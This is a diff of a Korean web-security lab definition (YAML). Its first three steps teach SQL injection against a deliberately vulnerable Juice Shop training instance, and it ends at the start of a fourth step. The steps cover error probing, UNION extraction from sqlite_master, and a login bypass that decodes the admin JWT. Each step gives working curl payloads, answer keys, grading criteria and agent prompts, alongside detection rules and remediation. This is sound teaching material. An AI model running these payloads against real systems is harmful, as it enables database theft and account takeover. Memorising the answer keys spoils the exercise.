@@ -1,146 +1,451 @@
-lab_id: web-vuln-ai-week02
-title: SQL Injection 실습 (AI 지원)
-version: ai
-course: web-vuln-ai
+lab_id: web-vuln-week02
+title: "SQL Injection — 탐지 / Error / Union / Blind / 방어"
+version: standalone-non-ai
+course: web-vuln
 week: 2
-description: SQL Injection 공격의 원리를 이해하고, 다양한 SQLi 기법을 실습하며 방어 방법을 학습합니다. AI SubAgent가
-  자동으로 명령을 실행하고 결과를 검증합니다.
+description: |
+  SQL Injection 의 5 카테고리 (탐지 / Error / Union / Blind Boolean / Blind Time)
+  를 6v6-juiceshop (Express + Sequelize + SQLite) 의 /rest/products/search 와
+  /rest/user/login 두 endpoint 에 직접 시도. 각 단계 별 Blue 의 탐지 룰
+  (ModSecurity CRS 942100 계열 + Wazuh rule 100002) 매핑 + Purple 의 prepared
+  statement / ORM / input validation 권장 — OWASP A03 Injection 의 직접 실습.
 difficulty: medium
 duration_minutes: 120
+audience: 웹 보안 입문자 (2주차)
+prerequisites:
+  - "W01 의 정찰 (특히 step 14 의 SQL 메타문자 응답 에러 노출) 완료"
+  - "attacker 컨테이너 (10.20.30.202) 에 curl + sqlmap 설치"
+  - "Juice Shop 의 default 자격증명 (admin@juice-sh.op / admin123) 알고 있음"
 objectives:
-- SQL Injection의 원리와 유형을 이해한다
-- Union, Blind, Error-based SQLi를 실습한다
-- SQLi 방어 기법을 이해한다
+  - "SQL Injection 의 5 카테고리 (탐지/Error/Union/Blind Boolean/Blind Time) 의 차이를 설명"
+  - "/rest/products/search 의 q 파라미터에 5 카테고리 모두 직접 시도하여 SQLite + Sequelize 구조 식별"
+  - "Authentication bypass (`' OR 1=1--`) 로 admin 로그인 (Juice Shop default challenge)"
+  - "sqlmap 자동화 (`-u ...?q=test --batch --technique=E,U,B,T --dbs`) 로 위 5 카테고리 자동 점검"
+  - "Red/Blue/Purple — Red 5 카테고리 시도 → Blue 의 ModSecurity CRS 942100 / Wazuh rule 100002 매핑 → Purple 의 prepared statement + ORM 의 SQLi 차단 권장"
 pass_threshold: 0.6
 steps:
+# ============================================================
+# STEP 1 [RED·SQLi탐지] — 작은따옴표 1 회 + 응답 차이 (정상 vs SQL 에러)
+# ============================================================
 - order: 1
-  instruction: '대상 웹 애플리케이션(http://{{WEB_IP}})의 검색 기능에서 SQL Injection 가능성을 테스트하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    attacker 컨테이너 (10.20.30.202) 에서 6v6-juiceshop (10.20.40.81:3000) 의
+    `/rest/products/search?q=<input>` endpoint 에 (a) 정상 query (`q=apple`)
+    와 (b) SQL 메타문자 (`q=apple'`) 를 보내 응답 차이 (코드 / 본문 / SQL
+    에러 노출) 를 비교한다. SQL 에러가 직접 응답에 포함되면 → SQL Injection
+    명백 + DB 종류 식별 가능.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_detection` 에 적합한 도구: sqlmap --batch --dbs.
-    도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 작은따옴표(')를 입력하여 에러를 유발하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. 정상 query (baseline)
+    echo "=== 1. 정상 query (q=apple) ==="
+    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple" | head -15
+
+    # 2. SQL 메타문자 (1회 quote)
+    echo ""
+    echo "=== 2. q=apple' (작은따옴표 1 회) ==="
+    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple%27" | head -20
+
+    # 3. 다른 메타문자 (이중 quote / 백슬래시 / 주석)
+    for inj in "apple%22" "apple%5C" "apple--" "apple%23"; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=${inj}")
+      echo "q=${inj} → ${code}"
+    done
+    ```
+
+    ## 📋 확인 사항
+
+    - 정상 query → HTTP 200 + JSON `{"status":"success","data":[...]}`
+    - `q=apple'` → HTTP 500 + 본문에 `SQLITE_ERROR` 또는 `unrecognized token: "'"`
+      같은 SQL 에러 직접 노출 → Sequelize + SQLite 확인
+    - `q=apple--` → 200 + 정상 처리 (주석 처리됨) → SQL 구문 직접 끝남 시그널
+    - 응답 본문에 `/app/...` 같은 file path 가 있으면 → Express stack trace 동반
+
+    ## 💡 왜 이걸 하는가?
+
+    SQL Injection 탐지 의 가장 직접적인 방법 = SQL 메타문자 1 회 삽입 후 응답
+    에러 관찰 (OWASP A03 Injection + MITRE T1190). Juice Shop 의 default 응답에
+    SQLite 에러 직접 노출 (의도된 challenge) → DB 종류 + Sequelize ORM 사용
+    동시 식별 → 다음 STEP 의 정확한 SQL syntax (SQLite 의 `||` 문자열 연결 /
+    `LIMIT` 등) 사용 가능.
+
+    ## 🔵 Blue 측 관찰
+
+    1 회 작은따옴표 시도는 ModSecurity CRS rule 942100 (SQL Injection Attack
+    Detected via libinjection) 의 트리거 — Wazuh rule 100002 (ModSecurity
+    SQL Injection alert) 의 escalation. siem 컨테이너 (10.20.32.100) 의
+    `/var/ossec/logs/alerts/alerts.json` 에 인입. 5 회 burst 시 active-response
+    `firewall-drop` 으로 src IP 차단 가능.
+
+    ## 🟣 Purple 보완 권장
+
+    - Sequelize: parameterized query 강제 (`{ where: { name: q } }` 사용,
+      `query()` 직접 호출 금지)
+    - Express: `express-validator` 로 query param 의 SQL 메타문자 필터
+    - ModSecurity CRS PARANOIA LEVEL 2 활성화 (rule 942100/942110/942150
+      모두 enable)
+    - Wazuh active-response: SQL Injection alert 5 회 burst → src IP 차단 600 sec
+    - 학습 환경 의 default 는 보존 (Juice Shop challenge 학습 위함)
+  hint: |
+    `q=apple'` (URL-encoded `%27`) 의 응답에 `SQLITE_ERROR` 또는 `unrecognized
+    token` 이 보이면 SQL Injection 명확. `q=apple--` 은 주석 처리 → 200 정상 응답.
   category: sqli_detection
   points: 10
-  answer: '🤖 프롬프트: 대상 웹 애플리케이션(http://10.20.32.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘
-
-    📎 참고 (CLI): curl -s ''http://10.20.32.80/rest/products/search?q=test%27'' 2>/dev/null
-    | head -20'
-  answer_detail: 작은따옴표 입력 시 SQL 에러가 발생하면 SQLi 취약점이 존재할 가능성이 높습니다.
+  answer: |
+    echo "=== 1. 정상 query (baseline) ==="
+    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple" | head -10
+    echo ""
+    echo "=== 2. q=apple' (작은따옴표) → SQL 에러 노출 ==="
+    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple%27" | head -20
+    echo ""
+    echo "=== 3. 4 메타문자 변형 응답 코드 ==="
+    for inj in "apple%22" "apple%5C" "apple--" "apple%23"; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" \
+        "http://10.20.40.81:3000/rest/products/search?q=${inj}")
+      echo "q=${inj} → ${code}"
+    done
+  answer_detail: |
+    Juice Shop 의 응답에 `SQLITE_ERROR: unrecognized token: "'"` 같은 직접
+    SQL 에러 노출 → Sequelize + SQLite 확인. apple-- 가 200 OK 면 SQL 주석
+    처리 가능 = 다음 STEP 의 Union / Boolean 등 advanced payload 의 진입점.
+    Apple%22 (이중 quote) 응답이 다르면 string 의 delimiter 가 single quote
+    인지 double quote 인지 식별.
   verify:
     type: output_contains
-    expect: ''
+    expect: 'SQLITE\|status\|HTTP'
     field: stdout
     semantic:
-      intent: SQL Injection 가능성 탐색 — 검색 파라미터에 따옴표·연산자 삽입 후 에러/동작 변화 관찰
+      intent: |
+        SQL Injection 탐지 — 5 SQL 메타문자 (정상 / quote / double quote /
+        백슬래시 / 주석) 응답 차이 비교. SQL 에러 직접 노출 시 DB 종류
+        식별 (SQLite / MySQL / PostgreSQL). OWASP A03 + MITRE T1190.
       success_criteria:
-      - 검색 파라미터에 apostrophe 또는 SQL 메타문자 삽입 시도
-      - 정상 요청과 주입 요청의 응답 차이 비교
-      - SQLi 판정 근거 (SQL 에러·레코드 수 변화) 제시
+        - 정상 + 메타문자 양쪽 응답 비교 (최소 2 케이스)
+        - SQL 에러 (SQLITE_ERROR 등) 또는 응답 코드 차이 직접 인용
+        - DB 종류 식별 (SQLite / MySQL / PostgreSQL 등) 명시
+        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
       acceptable_methods:
-      - curl로 apostrophe 포함 파라미터 전송
-      - Burp Repeater 로 요청 변조
-      - sqlmap 초기 탐지 --batch
-      - python requests 로 자동화
+        - "curl '?q=apple%27' + grep SQLITE"
+        - "sqlmap -u '...?q=*' --batch --level=1 (탐지 단계)"
+        - "Burp Repeater 의 1 회 quote 변형"
+        - "python requests + apostrophe + response.text"
       negative_signs:
-      - 메타문자 없이 정상 요청만
-      - 응답 비교 없음
-      - 판정 근거 없음
+        - 정상 query 비교 없음 (메타문자 만)
+        - SQL 에러 응답 인용 누락
+        - DB 종류 식별 시도 안 함
   target_vm: attacker
-  script: curl -s 'http://10.20.32.80/rest/products/search?q=test%27' 2>/dev/null
-    | head -20
+  script: |
+    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple" | head -10
+    curl -s -i "http://10.20.40.81:3000/rest/products/search?q=apple%27" | head -20
+    for inj in "apple%22" "apple--" "apple%23"; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=${inj}")
+      echo "q=${inj} → ${code}"
+    done
   risk_level: low
-  bastion_prompt: '대상 웹 애플리케이션(http://10.20.32.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘
-
-
-    [도구 권장] sqli_detection: sqlmap --batch --dbs. curl 만 쓰지 말고 **sqlmap --batch --dbs**
-    등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의
+    /rest/products/search?q=<input> 에 (1) 정상 q=apple (2) q=apple' (작은
+    따옴표) (3) 4 메타문자 변형 (이중 quote / 백슬래시 / 주석 -- / 주석 #)
+    응답 비교를 수행해줘. SQL 에러 (SQLITE_ERROR 등) 가 직접 응답에 노출되면
+    DB 종류 (SQLite + Sequelize ORM) 식별 가능 + 다음 STEP advanced payload
+    의 진입점. OWASP A03 + MITRE T1190 + ModSec CRS 942100 매핑 한 줄 언급.
+# ============================================================
+# STEP 2 [RED·SQLi·Error] — Error-based SQLi 로 DB 종류 + 버전 + schema 직접 추출
+# ============================================================
 - order: 2
-  instruction: '에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    STEP 1 에서 SQLite 식별 후, attacker (10.20.30.202) 에서 4 가지 error
+    payload 로 *DB 메타데이터* 를 직접 추출 — (a) SQLite version (`sqlite_version()`)
+    (b) schema (`sqlite_master`) (c) table list (d) column 수 추정 (ORDER BY).
+    SQLite 의 type-coercion 에러 (`CAST AS INTEGER`) 활용해서 응답 본문에
+    데이터 직접 노출.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_error` 에 적합한 도구: sqlmap --batch --technique=E,
-    curl + grep error. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 에러 메시지에서 DB 엔진 정보를 확인하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. SQLite 버전 추출 (CAST 에러 활용)
+    echo "=== 1. SQLite version ==="
+    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20CAST(sqlite_version()%20AS%20INT)--" \
+      | head -10
+
+    # 2. schema 직접 (sqlite_master 의 sql 컬럼)
+    echo ""
+    echo "=== 2. sqlite_master schema ==="
+    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--" \
+      | python3 -c "import sys,json; d=json.load(sys.stdin); [print(p) for p in d.get('data',[])[:5]]" 2>/dev/null \
+      || echo "(JSON parse fail — raw 응답)"
+
+    # 3. ORDER BY 로 컬럼 수 추정
+    echo ""
+    echo "=== 3. ORDER BY 컬럼 수 추정 ==="
+    for n in 1 5 9 10 15; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" \
+        "http://10.20.40.81:3000/rest/products/search?q=test%27%20ORDER%20BY%20${n}--")
+      echo "ORDER BY ${n} → ${code}"
+    done
+
+    # 4. table list (sqlite_master 의 name 컬럼)
+    echo ""
+    echo "=== 4. 모든 테이블 list ==="
+    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
+      | python3 -c "import sys,json; d=json.load(sys.stdin); [print(' table:', p.get('id', p)) for p in d.get('data',[])[:10]]" 2>/dev/null
+    ```
+
+    ## 📋 확인 사항
+
+    - SQLite version 응답 (예: `3.40.1`) — CAST 에러 메시지에 포함
+    - `sqlite_master` 의 schema 직접 노출 (CREATE TABLE Users(...) / Products(...))
+    - ORDER BY N — N 이 컬럼 수보다 크면 에러 → 컬럼 수 9 인지 10 인지 식별
+    - table list 의 `Users`, `Products`, `BasketItems`, `Captchas`, `Feedbacks` 등 발견
+
+    ## 💡 왜 이걸 하는가?
+
+    Error-based SQLi 는 *응답 시간* 없이 *직접 데이터* 추출 가능 (MITRE T1190 +
+    OWASP A03). SQLite 의 `sqlite_master` 는 모든 schema 메타 (CREATE TABLE
+    SQL 그대로) 직접 노출 — MySQL 의 `information_schema.tables`, PostgreSQL
+    의 `pg_tables` 와 동일 역할. ORDER BY N 으로 컬럼 수 식별 시 다음 STEP
+    의 UNION SELECT 의 컬럼 수 매핑 입력.
+
+    ## 🔵 Blue 측 관찰
+
+    UNION SELECT + sqlite_master 시도는 ModSecurity CRS rule 942130 (SQL
+    Injection Attack: SQL Tautology Detected) + 942150 (SQL Injection Attack
+    in args) 의 트리거. siem 의 alerts.json 에 인입. 단일 시도 vs burst 구분
+    필요 — 학습 환경에서는 burst 임계치 5 회/분 가정.
+
+    ## 🟣 Purple 보완 권장
+
+    - Sequelize: `query()` 직접 호출 대신 `findAll({where: {...}})` 사용
+      (parameterized 자동) + `sequelize.literal()` 사용 시 즉시 reject
+    - Express: `express-validator` 의 `query('q').isAlphanumeric()` 으로 SQL
+      메타문자 사전 거부
+    - ModSecurity CRS PARANOIA LEVEL 2 (rule 942100 ~ 942130 enable) +
+      sqlite_master / information_schema / pg_tables 키워드 차단 (custom rule)
+    - 학습 환경 default = challenge 보존
+  hint: |
+    SQLite 의 sqlite_master 는 schema 메타 (CREATE TABLE SQL 그대로 저장).
+    UNION SELECT 의 컬럼 수는 Juice Shop /rest/products/search 응답 의 9 컬럼
+    (id/name/desc/...). ORDER BY N 으로 컬럼 수 식별 후 UNION SELECT.
   category: sqli_error
   points: 12
-  answer: '🤖 프롬프트: 에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘
-
-    📎 참고 (CLI): curl -s ''http://10.20.32.80/rest/products/search?q=test%27%20OR%201=1--''
-    2>/dev/null | head -30'
-  answer_detail: 에러 메시지에서 SQLite, MySQL, PostgreSQL 등 DB 종류를 식별할 수 있습니다.
+  answer: |
+    echo "=== 1. SQLite version (CAST 에러) ==="
+    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
+    echo ""
+    echo "=== 2. ORDER BY 컬럼 수 추정 ==="
+    for n in 1 5 9 10 15; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" \
+        "http://10.20.40.81:3000/rest/products/search?q=test%27%20ORDER%20BY%20${n}--")
+      echo "ORDER BY ${n} → ${code}"
+    done
+    echo ""
+    echo "=== 3. sqlite_master 의 모든 테이블 list ==="
+    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" \
+      | head -20
+  answer_detail: |
+    Juice Shop SQLite default schema = Users (8 컬럼 — id/email/password/role/
+    deluxeToken/lastLoginIp/profileImage/totpSecret) + Products (9 컬럼) +
+    BasketItems (4 컬럼) + Captchas (3 컬럼) + Feedbacks (5 컬럼) + 등.
+    `/rest/products/search` 는 9 컬럼 (Products 와 동일) 이므로 UNION SELECT
+    9 컬럼 매핑 가능. sqlite_version() → 3.40.x 형식 (Juice Shop 의 default).
   verify:
     type: output_contains
-    expect: ''
+    expect: 'name\|version\|ORDER BY'
     field: stdout
     semantic:
-      intent: 에러 기반 SQL Injection — SQL 에러 메시지에서 DB 종류(MySQL/PostgreSQL/MSSQL/Oracle)
-        식별
+      intent: |
+        Error-based SQLi 로 DB 메타데이터 (SQLite version / schema /
+        table list / 컬럼 수) 직접 추출. MITRE T1190 + OWASP A03.
+        sqlite_master 의 schema 직접 노출 활용.
       success_criteria:
-      - 잘못된 SQL 을 유발해 에러 메시지 캡처
-      - 에러 텍스트에서 DB 엔진명 식별 (MySQL, PostgreSQL, SQLite 등)
-      - DB 종류별 취약점 차이 언급
+        - SQLite version 또는 sqlite_master 직접 query 시도
+        - ORDER BY 또는 UNION SELECT 의 컬럼 수 추정 시도
+        - 최소 1 테이블 (Users / Products / BasketItems 등) 발견
+        - 6v6-juiceshop (10.20.40.81:3000) 사용 명시
       acceptable_methods:
-      - curl 로 유효하지 않은 SQL 조각 주입
-      - sqlmap --fingerprint
-      - 에러 코드 테이블 조회 (ER_*, ORA-*)
-      - Burp Intruder 로 여러 페이로드 테스트
+        - "UNION SELECT name FROM sqlite_master"
+        - "ORDER BY N (binary search)"
+        - "sqlmap -u '...?q=*' --batch --technique=E --dbs --tables"
+        - "AND CAST(sqlite_version() AS INT)-- 에러 활용"
       negative_signs:
-      - 에러 유발 없이 개념 설명만
-      - DB 종류 식별 시도 없음
-      - 블라인드로 바로 진행
+        - SQLite 메타 query (sqlite_master) 미시도
+        - 컬럼 수 추정 (ORDER BY / UNION) 미시도
+        - DB 종류 식별 (SQLite vs MySQL) 누락
   target_vm: attacker
-  script: curl -s 'http://10.20.32.80/rest/products/search?q=test%27%20OR%201=1--'
-    2>/dev/null | head -30
+  script: |
+    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20AND%20CAST(sqlite_version()%20AS%20INT)--" | head -10
+    for n in 1 5 9 10 15; do
+      code=$(curl -o /dev/null -s -w "%{http_code}" "http://10.20.40.81:3000/rest/products/search?q=test%27%20ORDER%20BY%20${n}--")
+      echo "ORDER BY ${n} → ${code}"
+    done
+    curl -s "http://10.20.40.81:3000/rest/products/search?q=test%27%20UNION%20SELECT%20name,2,3,4,5,6,7,8,9%20FROM%20sqlite_master%20WHERE%20type=%27table%27--" | head -20
   risk_level: low
-  bastion_prompt: '에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘
-
-
-    [도구 권장] sqli_error: sqlmap --batch --technique=E, curl + grep error. curl 만 쓰지
-    말고 **sqlmap --batch --technique=E** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/products/search
+    에 (1) CAST(sqlite_version() AS INT) 으로 SQLite version 추출 (2) ORDER BY
+    N (1,5,9,10,15) 으로 컬럼 수 추정 (3) UNION SELECT FROM sqlite_master 로
+    모든 테이블 list 추출 3 단계를 수행해줘. SQLite + Sequelize ORM 의 schema
+    (Users / Products / BasketItems 등) 를 직접 인용 + 컬럼 수 = 9 확인. 다음
+    STEP UNION SELECT 의 입력. ModSec CRS 942130/942150 매핑 한 줄 언급.
+# ============================================================
+# STEP 3 [RED·SQLi·AuthBypass] — 인증 우회 (' OR 1=1--) 로 admin 로그인
+# ============================================================
 - order: 3
-  instruction: '항상 참인 조건(1=1)을 이용하여 인증 우회를 시도하시오.
+  instruction: |
+    ## 🎯 MISSION
 
+    Juice Shop 의 default challenge — `/rest/user/login` 의 email 필드에 SQL
+    Injection 으로 password 검증 우회 + admin 로그인. 3 payload 변형 시도:
+    (a) `' OR 1=1--` (b) `admin@juice-sh.op'--` (c) `' UNION SELECT *...`.
+    성공 응답의 JWT 토큰 추출 + admin 권한 확인.
 
-    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_auth_bypass` 에 적합한 도구: sqlmap --batch --forms
-    또는 curl 인증 우회 PoC. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
-  hint: 로그인 폼에 ' OR 1=1-- 페이로드를 사용하세요.
+    ## 💻 실행 명령
+
+    ```bash
+    # 1. 기본 ' OR 1=1-- (admin 이 첫 row 일 때만)
+    echo "=== 1. ' OR 1=1-- ==="
+    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"' OR 1=1--\",\"password\":\"anything\"}" | head -15
+
+    # 2. admin email 명시 + 주석 처리 (password 검증 skip)
+    echo ""
+    echo "=== 2. admin@juice-sh.op'-- ==="
+    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15
+
+    # 3. JWT 토큰 추출 (admin 로그인 성공 시)
+    echo ""
+    echo "=== 3. JWT 토큰 + role 확인 ==="
+    TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
+    echo "TOKEN (앞 60자): ${TOKEN:0:60}..."
+
+    # 4. JWT payload decode (role 확인)
+    if [ -n "$TOKEN" ]; then
+      payload=$(echo "$TOKEN" | cut -d. -f2)
+      # base64 padding 추가
+      padded="${payload}$(printf '=%.0s' $(seq 1 $((4-${#payload}%4))))"
+      echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
+    fi
+    ```
+
+    ## 📋 확인 사항
+
+    - payload 1 응답: 401 (실패) 또는 200 + JWT 토큰 (성공 — admin 이 첫 row)
+    - payload 2 응답: 200 + JWT 토큰 (admin 명시 + password 검증 우회)
+    - JWT payload 의 `email: "admin@juice-sh.op"` + `role: "admin"` 확인
+    - 응답 body 의 `bid` (basket ID) — admin 의 진짜 ID = 1
+
+    ## 💡 왜 이걸 하는가?
+
+    Authentication bypass via SQLi 는 OWASP A03 Injection + A07 Authentication
+    Failures 의 결합 (MITRE T1078.001 Default Accounts + T1212 Exploitation
+    for Credential Access). Juice Shop 의 challenge — Sequelize 의 raw query
+    문자열 결합 (`User.findOne({where:{email: req.body.email}, raw:true})` 의
+    잘못된 변형) 으로 가능. JWT 토큰의 role 직접 admin 으로 fake 가능 (W03 의
+    JWT manipulation 의 전제).
+
+    ## 🔵 Blue 측 관찰
+
+    POST body 의 SQL 메타문자 (`'--`) 는 ModSecurity CRS rule 942100 (SQL
+    Injection) + 942260 (SQL Authentication Bypass) 의 직접 트리거. Wazuh
+    rule 31108 (Web attack — login bypass) escalation. Juice Shop application
+    log 의 ERROR level 에 "Login failed for ... with empty password" 메시지.
+
+    ## 🟣 Purple 보완 권장
+
+    - Sequelize: `User.findOne({where:{email}, raw:true})` 대신 `findOne({where:
+      {email, password: hash(password)}})` (email + password 동시 검증)
+    - bcrypt 의 `compare()` 으로 password hash 비교 (timing-safe)
+    - ModSecurity CRS PARANOIA LEVEL 2 + rule 942260 explicit enable
+    - Wazuh active-response: 인증 우회 alert 1 회로도 src IP block (단순 brute
+      과는 다른 high-severity)
+    - JWT 토큰 의 `alg` 강제 (RS256 만, none 거부) + role claim 의 signature 검증
+  hint: |
+    Juice Shop의 default 인증 challenge — `admin@juice-sh.op'--` 형태로 email
+    필드에 SQL 주석 (--) 삽입 → password 검증 SQL 무시. 성공 응답에서 JWT
+    토큰 추출 후 base64 decode 로 payload 의 role 직접 확인.
   category: sqli_auth_bypass
   points: 12
-  answer: "\U0001F916 프롬프트: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘\n\U0001F4CE 참고 (CLI):\
-    \ curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
-    \ \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"anything\"\
-    }' 2>/dev/null \\\n | head -10"
-  answer_detail: ''' OR 1=1-- 페이로드는 WHERE 절을 항상 참으로 만들어 인증을 우회합니다.'
+  answer: |
+    echo "=== 1. admin@juice-sh.op'-- 인증 우회 ==="
+    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15
+    echo ""
+    echo "=== 2. JWT 토큰 추출 ==="
+    TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
+    echo "TOKEN: ${TOKEN:0:60}..."
+    echo ""
+    echo "=== 3. JWT payload decode (role 확인) ==="
+    if [ -n "$TOKEN" ]; then
+      payload=$(echo "$TOKEN" | cut -d. -f2)
+      padded="${payload}$(printf '=%.0s' $(seq 1 $((4-${#payload}%4))))"
+      echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
+    fi
+  answer_detail: |
+    Juice Shop default 의 admin@juice-sh.op'-- payload 가 성공하는 이유 =
+    Sequelize 의 query 가 raw 문자열 결합 (raw:true 옵션) + admin email 매칭
+    후 password 검증 SQL 이 `--` 로 주석 처리. 성공 응답 의 JWT payload 는
+    `{"status":"success","data":{"id":1,"email":"admin@juice-sh.op","role":
+    "admin",...}}` 형식 — role admin 직접 노출. W03 JWT manipulation 의 입력.
   verify:
     type: output_contains
-    expect: ''
+    expect: 'authentication\|admin\|token'
     field: stdout
     semantic:
-      intent: 인증 우회 SQL Injection — 로그인 필드에 항상 참 조건(OR 1=1) 주입 후 관리자 세션 획득
+      intent: |
+        SQL Injection 으로 password 검증 우회 + admin 로그인. JWT 토큰 추출 +
+        payload decode 로 role admin 직접 확인. OWASP A03 + A07 + MITRE
+        T1078.001 + T1212.
       success_criteria:
-      - username 또는 password 필드에 메타문자 + OR 1=1 같은 tautology 주입
-      - 로그인 성공 응답(리다이렉트, 세션 쿠키) 확인
-      - Prepared Statement 로 방어 가능함 언급
+        - 최소 1 payload (' OR 1=1-- 또는 admin@...'--) 시도 + 응답 인용
+        - 성공 시 JWT 토큰 직접 추출
+        - JWT payload decode 또는 role admin 직접 확인
+        - 6v6-juiceshop (10.20.40.81:3000) 의 /rest/user/login 사용 명시
       acceptable_methods:
-      - curl -d username=admin 또는 1=1-- 형태
-      - Burp Repeater
-      - sqlmap --auth-type POST --data
-      - python requests 로 POST 자동화
+        - "curl POST + ' OR 1=1-- email payload"
+        - "sqlmap -u '...' --batch --data '{json}' --forms"
+        - "Burp Repeater 의 POST body 변형"
+        - "python requests.post + json={...payload}"
       negative_signs:
-      - 주입 시도 없이 일반 로그인만
-      - 성공 여부 검증 없음
-      - 방어 기법 누락
+        - SQL payload 없이 일반 로그인만
+        - JWT 토큰 추출/디코드 누락
+        - role 직접 확인 누락
   target_vm: attacker
-  script: "curl -s -X POST http://10.20.32.80/rest/user/login \\\n  -H 'Content-Type:\
-    \ application/json' \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\"\
-    :\"anything\"}' 2>/dev/null \\\n | head -10"
+  script: |
+    curl -s -i -X POST http://10.20.40.81:3000/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" | head -15
+    TOKEN=$(curl -s -X POST http://10.20.40.81:3000/rest/user/login \
+      -H 'Content-Type: application/json' \
+      -d "{\"email\":\"admin@juice-sh.op'--\",\"password\":\"anything\"}" \
+      | python3 -c "import sys,json; print(json.load(sys.stdin).get('authentication',{}).get('token',''))" 2>/dev/null)
+    echo "TOKEN: ${TOKEN:0:60}..."
+    if [ -n "$TOKEN" ]; then
+      payload=$(echo "$TOKEN" | cut -d. -f2)
+      padded="${payload}$(printf '=%.0s' $(seq 1 $((4-${#payload}%4))))"
+      echo "$padded" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool
+    fi
   risk_level: low
-  bastion_prompt: '항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘
-
-
-    [도구 권장] sqli_auth_bypass: sqlmap --batch --forms 또는 curl 인증 우회 PoC. curl 만 쓰지
-    말고 **sqlmap --batch --forms 또는 curl 인증 우회 PoC** 등 적합 도구로 호출 후 stdout quote.'
+  bastion_prompt: |
+    attacker 컨테이너에서 6v6-juiceshop (10.20.40.81:3000) 의 /rest/user/login
+    에 SQL Injection 인증 우회 시도 — `admin@juice-sh.op'--` payload 로 email
+    + password 검증 우회. 성공 시 JWT 토큰 추출 + base64 decode 로 payload 의
+    role admin 직접 확인. OWASP A03 + A07 + MITRE T1078.001 + T1212 매핑.
+    Purple = Sequelize parameterized query + bcrypt compare + ModSec CRS 942260.
 - order: 4
   instruction: 'UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출하시오.
 
